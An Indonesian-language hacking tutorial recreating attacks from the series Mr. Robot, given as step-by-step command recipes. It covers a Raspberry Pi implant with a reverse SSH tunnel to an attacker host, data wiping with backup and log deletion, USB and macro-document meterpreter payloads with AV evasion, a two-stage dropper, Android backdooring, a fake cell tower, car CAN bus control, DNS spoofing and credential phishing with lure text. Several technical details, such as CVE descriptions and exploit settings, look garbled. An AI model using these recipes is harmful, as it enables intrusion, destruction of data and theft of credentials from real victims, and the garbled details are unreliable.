### **📌 Cara Kerja**
1. **Pasang Raspberry Pi** di **jaringan internal target** (contoh: di belakang server).
2. **Setup reverse SSH tunnel** untuk **akses dari luar**.
3. **Gunakan Pi sebagai pivot** untuk **mengakses jaringan internal**.

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `Raspberry Pi` | Mini computer | ~$35 |
| `autossh` | Auto-reconnect SSH | `apt install autossh` |
| `ngrok` | Tunneling | Manual install |
| `chisel` | HTTP tunneling | Manual install |
| `3G/4G USB Modem` | Koneksi internet independen | ~$20 |

---
### **📝 Step-by-Step**
#### **Langkah 1: Setup Raspberry Pi**
```bash
# Update & upgrade
sudo apt update && sudo apt upgrade -y

# Install autossh
sudo apt install -y autossh

# Enable SSH
sudo systemctl enable ssh
sudo systemctl start ssh
```

---
#### **Langkah 2: Setup Reverse SSH Tunnel**
**Di Raspberry Pi:**
```bash
# Buat script auto-reconnect
cat > /home/pi/reverse_ssh.sh << 'EOF'
#!/bin/bash
while true; do
    autossh -M 0 -N -R 2222:localhost:22 user@attacker.com -p 22 -o StrictHostKeyChecking=no
    sleep 60
done
EOF

chmod +x /home/pi/reverse_ssh.sh

# Jalankan di startup
crontab -e
```
**Tambahkan:**
```
@reboot /home/pi/reverse_ssh.sh
```
**Penjelasan:**
- `-R 2222:localhost:22` = **Forward port 2222 di attacker** ke **port 22 (SSH) di Pi**.
- `-M 0` = **Non-monitoring mode** (lebih stabil).
- `-N` = **No command execution** (hanya tunneling).

---
#### **Langkah 3: Setup di Attacker Machine**
**Di server attacker (VPS):**
```bash
# Tambahkan ke ~/.ssh/authorized_keys
echo "ssh-rsa AAAA...pi_public_key... pi@raspberrypi" >> ~/.ssh/authorized_keys
```

---
#### **Langkah 4: Connect ke Raspberry Pi**
```bash
# Di attacker machine
ssh -p 2222 pi@localhost
```
**Penjelasan:**
- `2222` = Port forward dari Pi.
- Sekarang Anda **terhubung ke Raspberry Pi** di jaringan target.

---
#### **Langkah 5: Pivoting (Akses Jaringan Internal)**
```bash
# Dari Raspberry Pi, scan jaringan internal
nmap -sn 192.168.1.0/24

# Forward port ke target internal
ssh -L 8080:192.168.1.100:80 pi@localhost -p 2222

# Sekarang akses 192.168.1.100:80 lewat localhost:8080
curl http://localhost:8080
```

---
#### **Langkah 6: Setup 3G/4G Modem (Opsional)**
**Untuk koneksi independen (tidak tergantung WiFi target):**
```bash
# Install sakis3g
git clone https://github.com/haudrauf/sakis3g.git
cd sakis3g
chmod +x sakis3g
sudo ./sakis3g connect
```
**Penjelasan:**
- **Sakis3g** = Tool untuk **koneksi 3G/4G** di Linux.
- **Raspberry Pi** bisa **terhubung ke internet via modem** → **Bisa diakses dari mana saja**.

---
### **🎯 Target Nyata di Mr. Robot**
- fsociety **memasang Raspberry Pi** di **Steel Mountain** untuk **mendapatkan akses remote** ke **sistem internal**.

---
### **⚠️ Catatan Penting**
- **Raspberry Pi Zero W** = **Kecil, murah, dan low power** (cocok untuk implant).
- **Gunakan power bank** untuk **pasokan listrik".
- **Sembunyikan Pi** di **tempat yang sulit terdeteksi** (contoh: di belakang server, di dalam switch).

---
---
---

---

## **🔹 11. S1E10: Five/Nine Hack (Mass Data Destruction)**
**Tujuan:** **Menghancurkan data** di **seluruh server E Corp** dengan **ransomware + wipe**.

---
### **📌 Cara Kerja**
1. **Encrypt semua file** (ransomware).
2. **Wipe data** (secure delete).
3. **Hapus backup** (agar tidak bisa recovery).

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `openssl` | Encrypt file | `apt install openssl` |
| `gpg` | Encrypt file | `apt install gnupg` |
| `shred` | Secure delete | Built-in Linux |
| `dd` | Wipe disk | Built-in Linux |
| `cipher` | Wipe free space | Built-in Linux |

---
### **📝 Step-by-Step**
#### **Langkah 1: Encrypt File (Ransomware Simulation)**
```bash
# Encrypt single file
openssl enc -aes-256-cbc -salt -in file.txt -out file.txt.enc

# Encrypt semua file di direktori
find /target -type f -exec openssl enc -aes-256-cbc -salt -in {} -out {}.enc \;
```
**Penjelasan:**
- `-aes-256-cbc` = Algoritma **AES-256** (kuat).
- `-salt` = Tambah **salt** untuk keamanan.
- File asli **dihapus** setelah di-encrypt.

---
#### **Langkah 2: Wipe Data (Secure Delete)**
```bash
# Wipe single file (overwrite 10x)
shred -vfz -n 10 file.txt

# Wipe semua file di direktori
find /target -type f -exec shred -vfz -n 10 {} \;

# Wipe disk (HATI-HATI!)
dd if=/dev/urandom of=/dev/sdX bs=1M
```
**Penjelasan:**
- `shred -n 10` = Overwrite **10 kali** dengan data random.
- `dd if=/dev/urandom` = Tulis **random data** ke disk.

---
#### **Langkah 3: Wipe Free Space**
```bash
# Wipe free space di disk
sfill /target
```
**Penjelasan:**
- `sfill` = Overwrite **free space** (file yang sudah dihapus).

---
#### **Langkah 4: Hapus Backup**
```bash
# Hapus semua backup
rm -rf /backup/*
rm -rf /mnt/backup/*

# Hapus snapshot VM
vboxmanage snapshot "VM_Name" deleteall
```
**Penjelasan:**
- **Backup** = **Target utama** (jika backup ada, data bisa dipulihkan).

---
#### **Langkah 5: Wipe Logs (Cover Tracks)**
```bash
# Hapus log sistem
rm -rf /var/log/*
> /var/log/syslog
> /var/log/auth.log

# Hapus history
history -c
rm ~/.bash_history
```
---
### **🎯 Target Nyata di Mr. Robot**
- fsociety **menghancurkan data E Corp** di **seluruh dunia** dengan **Five/Nine Hack**.
- Mereka **meng-encrypt + wipe** semua server E Corp.

---
### **⚠️ Catatan Penting**
- **Ini adalah serangan yang sangat merusak** (ilegal di hampir semua negara).
- **Gunakan hanya untuk testing di lab pribadi**.
- **Backup data Anda sebelum testing!**

---
---
---

---

## **🔹 12. S2E1: USB Ransomware Delivery**
**Tujuan:** **Menyebarkan ransomware** via **USB** untuk **meng-encrypt file korban**.

---
### **📌 Cara Kerja**
1. **Buat USB berisi ransomware**.
2. **Tinggalkan USB di tempat umum**.
3. **Korban memasang USB** → **Ransomware auto-execute**.
4. **Semua file korban di-encrypt**.

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `metasploit` | Generate ransomware | `apt install metasploit-framework` |
| `SET (Social Engineer Toolkit)` | USB Infectious Media | `apt install setoolkit` |
| `Veil-Framework` | AV-Evading Ransomware | `git clone https://github.com/Veil-Framework/Veil.git` |
| `Crypter` | Encrypt payload | Manual |

---
### **📝 Step-by-Step (SET)**
#### **Langkah 1: Jalankan SET**
```bash
sudo setoolkit
```
**Menu:**
```
1) Social-Engineering Attacks
2) Penetration Testing
3) Third Party Modules
```
**Pilih:** `1`

---
#### **Langkah 2: Pilih Attack Vector**
```
1) Spear-Phishing Attack Vectors
2) Website Attack Vectors
3) Infectious Media Generator
4) Create a Payload and Listener
5) Mass Mailer Attack
```
**Pilih:** `3` (Infectious Media Generator)

---
#### **Langkah 3: Pilih Payload**
```
1) Windows Batch File
2) Windows Executable
3) Windows HTA File
4) Mac OSX Application
5) Android APK
```
**Pilih:** `2` (Windows Executable)

---
#### **Langkah 4: Konfigurasi Payload**
- **Payload:** `windows/meterpreter/reverse_tcp`
- **LHOST:** `192.168.1.100` (IP attacker)
- **LPORT:** `4444`
- **Encoder:** `x86/shikata_ga_nai` (untuk bypass AV)
- **Output:** `ransomware.exe`

---
#### **Langkah 5: Buat Autorun.inf**
```bash
cat > autorun.inf << 'EOF'
[AutoRun]
open=ransomware.exe
action=Open folder to view files
EOF
```

---
#### **Langkah 6: Copy ke USB**
```bash
cp ransomware.exe autorun.inf /media/usb/
```

---
#### **Langkah 7: Setup Listener**
```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j
```

---
#### **Langkah 8: Tinggalkan USB**
- **Tinggalkan USB** di tempat umum.
- **Tunggu korban memasang USB** → **Ransomware auto-execute**.

---
### **🎯 Target Nyata di Mr. Robot**
- Darlene **menggunakan USB ransomware** untuk **menyerang Bank of E**.

---
### **⚠️ Catatan Penting**
- **Autorun dinonaktifkan di Windows modern** → Gunakan **Rubber Ducky** (lihat S3E7).
- **Ransomware ilegal** di hampir semua negara.

---
---
---

---

## **🔹 13. S2E2: Smart Home / IoT Hacking**
**Tujuan:** **Mengakses dan mengontrol perangkat IoT** (smart lamp, smart TV, dll).

---
### **📌 Cara Kerja**
1. **Scan jaringan** untuk **menemukan perangkat IoT**.
2. **Exploit default credentials** (admin:admin).
3. **Dapatkan akses** ke perangkat.
4. **Kontrol perangkat** (matikan lampu, buka kunci pintu, dll).

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `nmap` | Scan IoT devices | `apt install nmap` |
| `bettercap` | MITM IoT | `apt install bettercap` |
| `mosquitto` | MQTT client | `apt install mosquitto-clients` |
| `homeassistant` | Smart Home API | Manual install |
| `shodan` | IoT discovery | `pip install shodan` |

---
### **📝 Step-by-Step**
#### **Langkah 1: Scan Jaringan untuk IoT**
```bash
# Scan port umum IoT
nmap -p 80,443,1883,8883,5353,8080,8443 192.168.1.0/24 -sV

# Scan dengan script IoT
nmap --script=iot-* 192.168.1.0/24
```
**Output Contoh:**
```
192.168.1.50   8080/tcp open  http    Philips Hue Bridge
192.168.1.51   1883/tcp open  mqtt    MQTT Broker
```

---
#### **Langkah 2: Cari Default Credentials**
| Perangkat | Username | Password |
|-----------|----------|----------|
| **Philips Hue** | (tidak ada) | (tidak ada) |
| **Samsung SmartThings** | admin | 1234 |
| **D-Link Smart Plug** | admin | (kosong) |
| **TP-Link Smart Bulb** | admin | admin |
| **Xiaomi Smart Home** | admin | 12345678 |

---
#### **Langkah 3: Akses Philips Hue Bridge**
**Philips Hue** menggunakan **API HTTP** untuk kontrol.
```bash
# Cek API
curl http://192.168.1.50/api

# Output:
{"devicetype":"bridge"}

# Buat user baru
curl -X POST http://192.168.1.50/api -H "Content-Type: application/json" -d '{"devicetype":"hacker#phone"}'
```
**Output:**
```
[{"success":{"username": "abc123", "clientkey": "def456"}}]
```
- **Username:** `abc123`
- **Clientkey:** `def456`

---
#### **Langkah 4: Kontrol Lampu**
```bash
# Matikan lampu (ganti ID lampu)
curl -X PUT http://192.168.1.50/api/abc123/lights/1/state -H "Content-Type: application/json" -d '{"on":false}'

# Nyalakan lampu
curl -X PUT http://192.168.1.50/api/abc123/lights/1/state -H "Content-Type: application/json" -d '{"on":true, "bri":254}'

# Ubah warna (RGB)
curl -X PUT http://192.168.1.50/api/abc123/lights/1/state -H "Content-Type: application/json" -d '{"on":true, "xy":[0.5,0.5]}'
```

---
#### **Langkah 5: Hack MQTT (IoT Protocol)**
**MQTT** = Protocol untuk **IoT messaging** (contoh: smart sensor, smart plug).
```bash
# Subscribe ke semua topic
mosquitto_sub -h 192.168.1.51 -t "#" -v

# Publish command (contoh: matikan lampu)
mosquitto_pub -h 192.168.1.51 -t "home/lamp/1" -m "OFF"
```
**Penjelasan:**
- `-h 192.168.1.51` = MQTT broker IP.
- `-t "#"` = Subscribe **semua topic**.
- `-m "OFF"` = Pesan **matikan lampu**.

---
### **🎯 Target Nyata di Mr. Robot**
- Elliot **meng-hack smart home Susan Jacobs** (mantan CEO E Corp) untuk **mengontrol lampu dan kunci pintu**.

---
### **⚠️ Catatan Penting**
- **Banyak perangkat IoT** memiliki **keamanan yang buruk** (default credentials, no encryption).
- **Shodan** bisa digunakan untuk **mencari IoT yang terpapar ke internet**:
  ```bash
  shodan search "Philips Hue"
  shodan search "MQTT"
  ```

---
---
---

---

## **🔹 14. S2E4: Android Zero-Day Exploit**
**Tujuan:** **Mengeksploitasi vulnerability 0-day** di **Android** untuk **mendapatkan root access**.

---
### **📌 Cara Kerja**
1. **Cari vulnerability** di **Android kernel** (contoh: **CVE-2014-4321**).
2. **Exploit vulnerability** untuk **dapatkan root shell**.
3. **Install backdoor** untuk **persistence**.

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `metasploit` | Exploit Android | `apt install metasploit-framework` |
| `searchsploit` | Cari exploit | `apt install exploitdb` |
| `adb` | Debug Android | `apt install android-tools-adb` |
| `framaroot` | Root exploit | Manual download |
| `towelroot` | Root exploit | Manual download |

---
### **📝 Step-by-Step (CVE-2014-4321)**
**CVE-2014-4321** = **Fake ADB Server** yang memungkinkan **RCE** tanpa autentikasi.

---
#### **Langkah 1: Cari Target Vulnerable**
```bash
# Scan untuk Android dengan port 5555 terbuka
nmap -p 5555 192.168.1.0/24
```
**Output Contoh:**
```
192.168.1.100   5555/tcp open  android-debug-bridge
```

---
#### **Langkah 2: Exploit dengan Metasploit**
```bash
msfconsole
use exploit/android/adb/fake_adb_server
set RHOSTS 192.168.1.100
set LHOST 192.168.1.100  # IP attacker
set LPORT 4444
exploit
```
**Penjelasan:**
- **Fake ADB Server** = Menipu target untuk **connect ke attacker**.
- **Setelah exploit berhasil**, attacker mendapatkan **Meterpreter shell**.

---
#### **Langkah 3: Dapatkan Root Shell**
```bash
# Di Meterpreter
shell
whoami   # root
```
---
#### **Langkah 4: Install Backdoor (Persistence)**
```bash
# Upload backdoor
upload /path/to/backdoor.sh /data/local/tmp/

# Set executable
chmod +x /data/local/tmp/backdoor.sh

# Add to cron
echo "* * * * * /data/local/tmp/backdoor.sh" >> /etc/crontab
```
---
### **🎯 Target Nyata di Mr. Robot**
- Elliot **menggunakan 0-day exploit** untuk **meng-hack ponsel FBI agent**.

---
### **⚠️ Catatan Penting**
- **CVE-2014-4321** sudah **di-patch** di Android modern.
- **Untuk testing**, gunakan **Android 4.0-5.0** (Metasploitable 2).
- **0-day exploit** = **Vulnerability yang belum dipublikasikan** (sangat berharga).

---
---
---

---

## **🔹 15. S2E5: Femtocell Hack (IMSI Catcher / Stingray)**
**Tujuan:** **Membuat fake cell tower** untuk **intercept SMS, panggilan, dan data mobile**.

---
### **📌 Cara Kerja**
1. **Pasang Femtocell** (mini cell tower) di **lokasi target**.
2. **Konfigurasi untuk menipu ponsel** (seperti operator asli).
3. **Intercept traffic** (SMS, panggilan, data).
4. **Decrypt traffic** (jika terenkripsi).

---
### **🛠️ Tools**
| Tool | Fungsi | Harga |
|------|--------|-------|
| **OpenBTS** | GSM Base Station | ~$1000 |
| **YateBTS** | GSM Base Station | ~$500 |
| **BladeRF** | SDR (Software Defined Radio) | ~$300 |
| **HackRF** | SDR | ~$300 |
| **USRP** | SDR | ~$1000 |
| **LimeSDR** | SDR | ~$200 |
| **GQRX** | SDR GUI | `apt install gqrx` |
| **Wireshark** | Analisis traffic | `apt install wireshark` |

---
### **📝 Step-by-Step (OpenBTS)**
#### **Langkah 1: Setup OpenBTS**
```bash
# Install dependencies
sudo apt install -y git build-essential libusrp-dev libuhd-dev

# Clone OpenBTS
git clone https://github.com/RangeNetworks/dev.git
cd dev
./configure
make
```
---
#### **Langkah 2: Konfigurasi OpenBTS**
```bash
# Edit config
nano OpenBTS.config

# Ubah:
# GSM.Radio.Band = 900 (untuk Asia)
# GSM.Radio.C0 = 51 (channel)
# GSM.Identity.MCC = 510 (Indonesia: 510)
# GSM.Identity.MNC = 10 (XL Axiata)
# GSM.Identity.BSIC = 1
# GSM.Identity.LAC = 1
# GSM.Identity.RAC = 1
# GSM.Identity.CellID = 1
```
**Penjelasan:**
- **MCC (Mobile Country Code)** = Kode negara (Indonesia: **510**).
- **MNC (Mobile Network Code)** = Kode operator (XL: **10**, Telkomsel: **01**).
- **Band 900** = Frekuensi yang digunakan di Indonesia.

---
#### **Langkah 3: Jalankan OpenBTS**
```bash
# Start OpenBTS
sudo ./OpenBTS
```
**Output:**
```
[+] OpenBTS started on channel 51 (900 MHz)
[+] Waiting for mobile devices to connect...
```

---
#### **Langkah 4: Intercept Traffic**
- **Ponsel korban** akan **auto-connect** ke **OpenBTS** (seperti operator asli).
- **Semua traffic** (SMS, panggilan, data) **melewati OpenBTS**.
- **Gunakan Wireshark** untuk **analisis traffic**:
  ```bash
  wireshark
  ```
  - Filter: `gsm` (untuk GSM traffic).

---
#### **Langkah 5: Decrypt Traffic (Jika Terenkripsi)**
```bash
# Gunakan A5/1 Cracker (untuk GSM)
# Tools: kraken, a51
git clone https://github.com/darksim/a51.git
cd a51
make
./a51 -k 0x1234567890abcdef -f capture.pcap
```
**Penjelasan:**
- **A5/1** = Algoritma enkripsi GSM.
- **Kunci (key)** bisa didapatkan dari **SIM card** atau **brute force**.

---
### **🎯 Target Nyata di Mr. Robot**
- Elliot **memasang Femtocell** di **kantor FBI** untuk **intercept traffic mobile** dan **mendapatkan informasi**.

---
### **⚠️ Catatan Penting**
- **Femtocell Hack ILEGAL** di hampir semua negara (interferensi spektrum frekuensi).
- **Hanya untuk penelitian dengan izin**.
- **Gunakan di lab terisolasi** (dengan peralatan SDR yang legal).

---
---
---

---

## **🔹 16. S2E7: Reverse Shell Two-Stage Exploit**
**Tujuan:** **Menggunakan exploit dua tahap** untuk **bypass deteksi**.

---
### **📌 Cara Kerja**
1. **Stage 1 (Dropper)**: File kecil yang **download Stage 2**.
2. **Stage 2 (Payload)**: **Full malware** (reverse shell, ransomware, dll).
3. **Stage 1 tidak mencurigakan** (kedetect sebagai "potentially unwanted").
4. **Stage 2 di-download dan di-execute** di memory.

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `metasploit` | Generate payload | `apt install metasploit-framework` |
| `msfvenom` | Payload generator | (bundled Metasploit) |
| `powershell` | Download & execute | Built-in Windows |
| `Donut` | Convert .NET to shellcode | `git clone https://github.com/TheWover/donut.git` |
| `sRDI` | Shellcode Reflective DLL Injection | Manual |

---
### **📝 Step-by-Step**
#### **Langkah 1: Generate Stage 2 (Payload)**
```bash
msfvenom -p windows/meterpreter/reverse_https \
    LHOST=192.168.1.100 LPORT=443 \
    -f raw -o stage2.bin
```
**Penjelasan:**
- `reverse_https` = Komunikasi via **HTTPS** (lebih stealth).
- `raw` = Format **shellcode** (bukan EXE).

---
#### **Langkah 2: Generate Stage 1 (Dropper)**
```bash
msfvenom -p windows/download_exec \
    URL=http://192.168.1.100/stage2.bin \
    -f exe -o stage1.exe
```
**Penjelasan:**
- `download_exec` = **Download & execute** file.
- `URL` = Alamat **Stage 2**.

---
#### **Langkah 3: Obfuscate Stage 1**
```bash
# Gunakan Veil-Framework untuk bypass AV
git clone https://github.com/Veil-Framework/Veil.git
cd Veil
./Veil-Evasion.py
```
**Menu:**
```
1) Generate shellcode
2) Generate executable
```
**Pilih:** `2`
- **Payload:** `stage1.exe`
- **Output:** `obfuscated_stage1.exe` (bypass AV).

---
#### **Langkah 4: Setup Web Server**
```bash
# Host Stage 2
python3 -m http.server 80
# Atau gunakan ngrok:
ngrok http 80
```
---
#### **Langkah 5: Kirim Stage 1 ke Korban**
- **Phishing email** dengan attachment `obfuscated_stage1.exe`.
- **USB drop attack** (lihat S1E6).
- **Drive-by download** (lihat Bab 4.2).

---
#### **Langkah 6: Setup Listener**
```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
exploit -j
```
**Penjelasan:**
- **Stage 1** akan **download Stage 2** dari server.
- **Stage 2** akan **connect ke listener** → **Meterpreter shell**.

---
### **🎯 Target Nyata di Mr. Robot**
- Elliot menjelaskan **two-stage exploit** kepada Darlene:
  > "Step three, a reverse shell two-stage exploit."

---
### **⚠️ Catatan Penting**
- **Two-stage exploit** sulit dideteksi AV karena **Stage 1 tidak berbahaya**.
- **Stage 2** bisa **di-update** tanpa mengubah Stage 1.
- **Gunakan untuk bypass deteksi** (EDR, antivirus).

---
---
---

---

## **🔹 17. S2E9: Car Hacking (CAN Bus)**
**Tujuan:** **Mengakses dan mengontrol mobil** via **CAN Bus** (Controller Area Network).

---
### **📌 Cara Kerja**
1. **Hubungkan ke OBD-II port** (atau **CAN Bus langsung**).
2. **Send CAN messages** untuk **kontrol mobil** (buka kunci, matikan mesin, dll).
3. **Exploit vulnerability** (contoh: **Uconnect Hack**).

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `can-utils` | CAN Bus tools | `apt install can-utils` |
| `SocketCAN` | CAN Bus kernel | Built-in Linux |
| `ICSim` | CAN Bus Simulator | `git clone https://github.com/zombieCraig/ICSim.git` |
| `OBD-II Adapter` | Koneksi ke mobil | ~$20 (ELM327) |
| `Ubertooth` | Bluetooth CAN Bus | Hardware (~$100) |

---
### **📝 Step-by-Step**
#### **Langkah 1: Setup CAN Bus Interface**
```bash
# Load kernel modules
sudo modprobe vcan
sudo modprobe can
sudo modprobe can_raw
sudo modprobe can_dev

# Buat virtual CAN interface
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0
```
**Penjelasan:**
- `vcan0` = **Virtual CAN interface** (untuk testing).
- Untuk **mobil nyata**, gunakan **OBD-II adapter** (ELM327).

---
#### **Langkah 2: Install can-utils**
```bash
sudo apt install -y can-utils
```

---
#### **Langkah 3: Dump CAN Messages**
```bash
# Dump semua CAN messages
candump vcan0
```
**Output Contoh:**
```
vcan0  123     [8]  01 02 03 04 05 06 07 08
vcan0  456     [8]  FF FE FD FC FB FA F9 F8
```
- **123** = CAN ID.
- **[8]** = Length (8 bytes).
- **01 02 03...** = Data.

---
#### **Langkah 4: Send CAN Messages (Kontrol Mobil)**
**Contoh: Buka Kunci Pintu**
```bash
# Format: cansend <interface> <CAN_ID>#<DATA>
cansend vcan0 123#0100000000000000
```
**Contoh: Matikan Mesin**
```bash
cansend vcan0 456#DEADBEEF00000000
```

---
#### **Langkah 5: ICSim (CAN Bus Simulator)**
**ICSim** = **Simulator CAN Bus** untuk latihan.
```bash
# Clone ICSim
git clone https://github.com/zombieCraig/ICSim.git
cd ICSim

# Setup virtual CAN
sudo ./setup_vcan.sh

# Jalankan ICSim (mobil)
sudo ./icsim vcan0

# Jalankan controls (dashboard)
sudo ./controls vcan0
```
**Penjelasan:**
- **ICSim** = Simulasi **mobil** (speed, RPM, dll).
- **controls** = Dashboard untuk **mengontrol mobil**.

---
#### **Langkah 6: Exploit Uconnect (Jeep Hack)**
**Uconnect** = **Sistem infotainment Jeep** yang **vulnerable** (CVE-2015-3924).

---
##### **Cara 1: Via CAN Bus (OBD-II)**
```bash
# Send CAN message untuk unlock
cansend can0 7E8#023E00000000000000
```
**Penjelasan:**
- **7E8** = CAN ID untuk **Uconnect**.
- **02 3E 00...** = **Unlock command**.

---
##### **Cara 2: Via Sprint Network (Remote)**
**Tools: Uconnect Exploit (Charlie Miller & Chris Valasek)**
```bash
# Download exploit
git clone https://github.com/nccgroup/JeepHack.git
cd JeepHack

# Jalankan exploit
python3 uconnect_exploit.py <TARGET_IP>
```
**Penjelasan:**
- **TARGET_IP** = IP **Uconnect head unit** (terhubung ke Sprint network).
- **Exploit** akan **mengirim CAN messages** untuk **kontrol mobil**.

---
### **🎯 Target Nyata di Mr. Robot**
- Elliot **mengeksploitasi CAN Bus** untuk **mengontrol mobil** (walaupun tidak ditampilkan secara detail di serial).

---
### **⚠️ Catatan Penting**
- **CAN Bus Hacking ILEGAL** jika dilakukan tanpa izin.
- **Hanya untuk penelitian** (contoh: **CAN Bus CTF**).
- **Gunakan ICSim** untuk **latihan legal**.

---
---
---

---

## **🔹 18. S2E11: DNS Spoofing**
**Tujuan:** **Mengalihkan traffic korban** ke **server attacker** dengan **DNS Spoofing**.

---
### **📌 Cara Kerja**
1. **Attacker mengontrol DNS server** (atau **ARP spoofing**).
2. **Korban request DNS** (contoh: `facebook.com`).
3. **Attacker balas dengan IP attacker** (contoh: `192.168.1.100`).
4. **Korban terhubung ke attacker** (bukan Facebook).

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `ettercap` | DNS Spoofing | `apt install ettercap` |
| `dnsspoof` | DNS Spoofing | `apt install dsniff` |
| `bettercap` | DNS Spoofing | `apt install bettercap` |
| `dnsmasq` | DNS Server | `apt install dnsmasq` |

---
### **📝 Step-by-Step (Ettercap)**
#### **Langkah 1: Enable IP Forwarding**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

---
#### **Langkah 2: Setup DNS Spoofing**
```bash
ettercap -T -q -i wlan0 -P dns_spoof -M ARP:REMOTE /192.168.1.1/ /192.168.1.100/
```
**Penjelasan:**
- `-P dns_spoof` = Plugin **DNS Spoofing**.
- **Ettercap** akan **mengalihkan semua DNS request** ke **attacker**.

---
#### **Langkah 3: Konfigurasi Spoof File**
**Edit `/etc/ettercap/etter.dns`:**
```
facebook.com    A    192.168.1.100
*.facebook.com  A    192.168.1.100
google.com      A    192.168.1.100
```
**Penjelasan:**
- **facebook.com** → **192.168.1.100** (IP attacker).
- **\*.facebook.com** = **Semua subdomain**.

---
#### **Langkah 4: Jalankan Phishing Server**
```bash
# Clone halaman Facebook
httrack https://facebook.com -O ./phish_site

# Host phishing page
python3 -m http.server 80
```
**Penjelasan:**
- Korban **mengakses facebook.com** → **terhubung ke 192.168.1.100** → **lihat halaman phishing**.

---
#### **Langkah 5: Capture Credentials**
Lihat Bab 9.1 untuk **capture credentials**.

---
### **🎯 Target Nyata di Mr. Robot**
- Elliot **menggunakan DNS Spoofing** untuk **mengalihkan traffic E Corp** ke **server fsociety**.

---
### **⚠️ Catatan Penting**
- **DNS Spoofing** hanya bekerja di **jaringan lokal** (LAN).
- **Untuk internet**, gunakan **DNS Hijacking** (mengubah DNS server korban).
- **HTTPS** (SSL/TLS) **tidak bisa dispoof** (korbah akan melihat **certificate error**).

---
---
---

---

## **🔹 19. S3E1: Malicious Document (Macro Virus)**
**Tujuan:** **Menginfeksi korban** dengan **dokumen (Word, Excel) berisi macro malicious**.

---
### **📌 Cara Kerja**
1. **Buat dokumen Word/Excel** dengan **macro VBA malicious**.
2. **Kirim dokumen ke korban** (email, USB, dll).
3. **Korban membuka dokumen** → **Macro auto-execute** → **Download & execute payload**.

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `Microsoft Office` | Buat dokumen | Manual |
| `Unicorn` | Generate macro | `git clone https://github.com/trustedsec/unicorn.git` |
| `Veil-Framework` | AV-Evading Payload | `git clone https://github.com/Veil-Framework/Veil.git` |
| `Metasploit` | Generate payload | `apt install metasploit-framework` |
| `Social Engineer Toolkit` | Generate doc | `apt install setoolkit` |

---
### **📝 Step-by-Step (Unicorn)**
#### **Langkah 1: Generate Macro Payload**
```bash
git clone https://github.com/trustedsec/unicorn.git
cd unicorn
python3 unicorn.py
```
**Menu:**
```
1) windows/meterpreter/reverse_tcp
2) windows/meterpreter/reverse_https
...
```
**Pilih:** `1` (reverse_tcp)
**Masukkan:**
- **LHOST:** `192.168.1.100`
- **LPORT:** `4444`
- **Output:** `macro.txt`

---
#### **Langkah 2: Insert Macro ke Dokumen Word**
1. **Buka Microsoft Word**.
2. **Tekan `Alt + F11`** untuk **membuka VBA Editor**.
3. **Insert → Module**.
4. **Paste isi `macro.txt`**.
5. **Save dokumen** sebagai **`.docm`** (Macro-Enabled).

---
#### **Langkah 3: Setup Listener**
```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j
```

---
#### **Langkah 4: Kirim Dokumen ke Korban**
- **Email Phishing**:
  ```
  Subject: Invoice Pembayaran - Harap Dicek
  Attachment: invoice.docm
  ```
- **USB Drop Attack** (lihat S1E6).

---
#### **Langkah 5: Korban Membuka Dokumen**
- **Korban membuka `invoice.docm`** → **Macro auto-run** (jika **Macro Enabled**).
- **Payload connect ke attacker** → **Meterpreter shell**.

---
### **🎯 Target Nyata di Mr. Robot**
- Elliot **mengirim dokumen berisi macro** ke **E Corp employee** untuk **mendapatkan akses**.

---
### **⚠️ Catatan Penting**
- **Macro dinonaktifkan oleh default** di Office modern.
- **Gunakan social engineering** untuk **meyakinkan korban enable macro**:
  ```
  "Dokumen ini memerlukan macro untuk menampilkan data dengan benar."
  ```
- **Alternatif:** Gunakan **Office Exploit** (CVE-2017-0199, dll) untuk **RCE tanpa macro**.

---
---
---

---

## **🔹 20. S3E2: Phishing OWA (Outlook Web Access)**
**Tujuan:** **Mencuri credentials Outlook Web Access (OWA)** dengan **phishing**.

---
### **📌 Cara Kerja**
1. **Clone halaman login OWA E Corp**.
2. **Host halaman phishing** di server attacker.
3. **Kirim link ke korban** (email, SMS).
4. **Korban login** → **Credentials ter-capture**.

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `SET (Social Engineer Toolkit)` | Clone OWA | `apt install setoolkit` |
| `Gophish` | Phishing Framework | Manual install |
| `Evilginx2` | Reverse Proxy Phisher | `git clone https://github.com/kgretzky/evilginx2.git` |
| `Apache2/Nginx` | Web Server | `apt install apache2` |

---
### **📝 Step-by-Step (SET)**
#### **Langkah 1: Jalankan SET**
```bash
sudo setoolkit
```
**Menu:**
```
1) Social-Engineering Attacks
2) Penetration Testing
3) Third Party Modules
```
**Pilih:** `1`

---
#### **Langkah 2: Pilih Attack Vector**
```
1) Spear-Phishing Attack Vectors
2) Website Attack Vectors
3) Infectious Media Generator
4) Create a Payload and Listener
5) Mass Mailer Attack
```
**Pilih:** `2` (Website Attack Vectors)

---
#### **Langkah 3: Pilih Attack Method**
```
1) Java Applet Attack Method
2) Metasploit Browser Exploit Method
3) Credential Harvester Attack Method
4) TabNabbing Attack Method
5) Web Jacking Attack Method
6) Multi-Attack Web Method
```
**Pilih:** `3` (Credential Harvester)

---
#### **Langkah 4: Pilih Template**
```
1) Clone a website
2) Custom import
3) Use SET pre-made template
```
**Pilih:** `1` (Clone a website)
**Masukkan URL:** `https://mail.ecorp.com/owa`

---
#### **Langkah 5: Setup Listener**
```bash
# SET akan otomatis setup listener di port 80
# Credentials tersimpan di: /root/.set/reports/
```

---
